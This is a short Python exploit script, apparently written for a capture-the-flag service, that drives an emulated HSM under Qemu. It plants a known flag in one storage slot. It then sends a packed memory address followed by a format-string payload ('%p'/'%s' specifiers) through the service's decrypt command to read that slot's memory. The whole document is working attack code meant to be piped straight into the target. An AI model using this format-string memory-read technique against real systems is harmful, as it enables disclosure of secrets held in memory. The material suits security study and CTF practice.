#!/usr/bin/env python3
# Attention!
# This is a preliminary exploit for service stub.
# Generates commands for direct HSM (Qemu) input.
# Usage: ./sploit.debug.py SLOT | ./run.sh

import argparse
import struct
import sys
import time

SLOT_AREA = 0x40029530
SLOT_SIZE = 444
META_OFFSET_IN_SLOT = 4


def write(data):
  if isinstance(data, str):
    data = data.encode()
  sys.stdout.buffer.write(data)
  sys.stdout.flush()
  time.sleep(0.1)


def parse_args():
  parser = argparse.ArgumentParser()
  parser.add_argument("slot", metavar="SLOT", type=int, help="Slot to store flag (= slot to attack)")
  parser.add_argument("--debug", action="store_true")
  return parser.parse_args()


def main():
  args = parse_args()

  flag_slot = args.slot
  attacker_slot = 1 if args.slot == 0 else 0

  offset_to_read = SLOT_AREA + SLOT_SIZE * args.slot + META_OFFSET_IN_SLOT
  print("[exploit] Offset to read: 0x%08x" % offset_to_read, file=sys.stderr)

  write("setmeta {} FLAGFLAGFLAGFLAGFLAGFLAGFLAGFLAG\n".format(flag_slot))

  write("setmeta {} 012345678901234567890123456789xxx\n".format(attacker_slot))

  write("decrypt {} ___".format(attacker_slot))
  write(struct.pack(">I", offset_to_read))
  write("%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p{}\n".format("%p" if args.debug else "%s"))  # Decryption method stub

  write("getmeta {}\n".format(attacker_slot))


if __name__ == "__main__":
  main()
